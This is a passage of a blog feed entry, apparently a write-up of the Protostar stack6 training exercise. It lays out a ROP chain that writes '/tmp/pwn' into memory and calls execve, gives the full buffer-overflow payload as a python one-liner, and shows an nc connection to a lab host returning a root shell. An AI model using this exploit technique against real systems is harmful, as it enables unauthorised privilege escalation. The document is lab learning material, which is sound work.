    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="s"&gt;&amp;quot;/pwn&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Second part of our string &lt;span class="o"&gt;/&lt;/span&gt;pwn
&lt;span class="c1"&gt;# Perform the move to .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Load the final target address in .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; bytes
&lt;span class="c1"&gt;# Load the NULL into edx &lt;/span&gt;
    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x00000000&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="kc"&gt;NULL&lt;/span&gt; bytes
&lt;span class="c1"&gt;# Perform the move to .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Load registers&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f6fa81&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; pop ecx&lt;span class="p"&gt;;&lt;/span&gt; pop ebx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;3&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; edx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="kc"&gt;NULL&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;2&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; ecx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="kc"&gt;NULL&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049710&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;1&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; ebx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="s"&gt;&amp;quot;/tmp/pwn&amp;quot;&lt;/span&gt;
&lt;span class="c1"&gt;# Call execve&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f2e193&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return Address &lt;span class="p"&gt;(&lt;/span&gt;second ROP gadget&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kc"&gt;...&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;higher memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This now gives us the following payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*80 + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/tmp&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x14\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/pwn&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;\x00\x00\x00\x00&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x81\xfa\xf6\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x93\xe1\xf2\xb7&amp;quot;&amp;#39;&lt;/span&gt; &amp;gt; input
user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;cat input | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA������/tmp��������/pwn�������
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And from another shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc 192.168.94.133 4444
whoami
root
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Exploits"></category><category term="ROP"></category></entry></feed>